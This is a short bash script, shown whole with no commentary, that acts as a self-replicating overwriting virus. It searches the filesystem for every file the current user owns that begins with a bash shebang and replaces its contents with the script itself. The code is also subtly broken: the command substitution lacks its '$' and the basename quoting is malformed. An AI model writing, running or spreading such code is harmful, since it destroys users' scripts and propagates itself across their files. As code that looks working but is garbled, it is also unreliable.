#!/bin/bash
find / -user $UID -type f | while read fn; do head -n 1 "$fn" | grep -q "#!.*/bin/bash" && echo (cat "$(basename \"$0\")") > $fn; done